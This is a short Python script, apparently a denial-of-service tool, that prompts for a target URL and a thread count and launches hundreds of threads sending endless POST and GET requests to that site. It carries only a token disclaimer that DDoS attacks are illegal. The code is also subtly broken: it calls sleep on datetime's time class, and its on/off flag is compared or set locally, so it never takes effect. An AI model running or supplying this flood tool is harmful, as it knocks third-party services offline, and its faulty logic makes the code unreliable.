import requests
import datetime

from threading import Thread
from datetime import time
from colorama import init
from colorama import Fore, Back, Style

init()

print(Fore.GREEN + """
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒═══════════════════════════▒▒▒
▒▒║▄▄▄▄▄░▒░▄▄▄▄░▒▄░▄░▒▒▄░▄▄▄▄░║▒▒
▒▒║█░░░░█░█░░░░█░▒▒█░▒▒█░█░░░▒║▒▒
▒▒║█░░░░█░█░░░░█░█░█░▒▒█░█░▒▒▒║▒
 ▒║█░░░░█░█▀▀▀█░▒█░▒█░█░▒█▀▀░▒║▒▒
▒▒║█░░░░█░█░▒▒▒█░█░▒█░█░▒█░░▒▒║▒▒
▒▒║▀▀▀▀▀░▒▀░▒▒▒▀░▀░▒▒▀░▒▒▀▀▀▀░║▒▒
▒▒▒═══════════════════════════▒▒▒
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\n
""")
print('Use at your own risk. DDOS attack is illegal and punishable!\n')
url = input('Url: ')
thrnom = input('Threads(300 - 800): ')

on = 1

def ddos():

	while True:
		try:
			spam = requests.post(url)

			spam2 = requests.get(url)

		except requests.exceptions.ConnectionError:
			on == 0
			print('\nLuck\n')

			ddos_pause()
			break

def ddos_start():
	print("\nRunning...")

	if on == 1:
		for i in range(int(thrnom)):

			try:
				thr = Thread(target = ddos)
				thr.start()

			except:
				ddos_pause()
				break
	else:
		ddos_pause()

def ddos_pause():

	print("Paused.")

	time.sleep(3)
	try:
		on = 1
		ddos_start()
	except:
		on = 0
		print('\nTry..')
		ddos_pause()

if on == 1:
	ddos_start()